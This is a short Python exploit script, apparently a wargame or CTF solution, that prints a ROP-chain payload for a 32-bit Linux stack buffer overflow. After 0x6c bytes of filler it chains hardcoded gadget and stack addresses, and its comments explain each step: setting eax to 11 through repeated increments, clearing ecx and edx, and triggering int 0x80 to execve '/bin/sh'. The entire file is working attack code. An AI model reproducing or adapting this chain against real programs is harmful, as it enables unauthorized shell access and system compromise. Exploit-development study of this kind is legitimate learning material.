#!/usr/bin/env python
from struct import pack

#(1) - buf filler, make ebp goto ret(3)+16B for (3), change RET to (1), pop #3221130028 into ebx for (2), ret to (2)
print ('A'*0x6c + pack('<IIII', 0xbffe8b98+40, 0x0806669a, 0xbffe8b2c, 0x080643e8) +

	#(2) - edx clrd, ebx used for div, eax|ecx clob, pop junk into ebx|esi, ret to (3)
	'A'*8 + pack('<I', 0x0808ff7d) +

	#(3) - ecx|eax clrd, esp = ebp-12 (effectively no change after pop ret(3)), pop our *string into ebx, 
	#		esi|edi|ebp junk (ebp still user space), ret to (4), esp += 12B
	pack('<I', 0xbffe8c2c) + 'A'*8 + pack('<II', 0xbffe8c2c, 0x08050bbc) + 'A'*12 +

	#(4) - increment eax & pop junk into edi x11, ret to (5) on 11th loop iteration
	pack('<II', 0x41414141, 0x08050bbc)*10 + pack('<II', 0x41414141, 0x08055d70) +

	#(5) - int 0x80 called w/ eax = 11 (sys_execve), ebx = addr on stack right here, ecx = edx = NULL
	'/bin/sh')